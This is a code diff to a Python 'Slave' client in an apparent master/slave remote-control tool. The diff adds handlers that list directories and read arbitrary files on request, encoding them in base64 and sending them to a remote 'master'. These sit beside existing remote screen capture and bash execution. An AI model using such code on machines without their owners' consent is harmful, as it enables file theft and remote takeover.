@@ -1,13 +1,18 @@
 from __future__ import annotations
 
+import base64
+import json
+import os
+import sys
 import threading
 import time
+from pathlib import Path
 from typing import Optional
 
 import pyautogui
 
 from client.client import Client, Payload
-from utils import capture_screen, execute_bash, encode_base64
+from utils import capture_screen, execute_bash, encode_base64, build_local_tree
 
 pyautogui.FAILSAFE = False
 pyautogui.PAUSE = 0
@@ -225,6 +230,39 @@ class Slave(Client):
                     self.send(f"send slave_screen {master} {frame}")
             except Exception as e:
                 print(f"[slave] single frame error: {e}")
+
+        elif subject == "common_info":
+            master = tokens[-1]
+            try:
+                info = {
+                    "path": str(Path.cwd())
+                }
+                if master:
+                    self.send(f"send common_info {master} {encode_base64(json.dumps(info))}")
+            except Exception as e:
+                print(f"[slave] common info consuming error: {e}")
+
+        elif subject == "local":
+            path = " ".join(tokens[2:-1])
+            master = tokens[-1]
+            try:
+                local = build_local_tree(path)
+                if master:
+                    self.send(f"send local {master} {encode_base64(json.dumps(local))}")
+            except Exception as e:
+                print(f"[slave] local consuming error: {e}")
+
+        elif subject == "file":
+            path = " ".join(tokens[2:-1])
+            master = tokens[-1]
+            try:
+                with open(path, "rb") as file:
+                    content = base64.b64encode(file.read()).decode("ascii")
+                    payload = encode_base64(f"{path}\1{content}")
+                    if master:
+                        self.send(f"send file {master} {payload}")
+            except Exception as e:
+                print(f"[slave] file consuming error: {e}")
 
         elif subject == "bash_execution":
             bash = " ".join(tokens[2:-1])
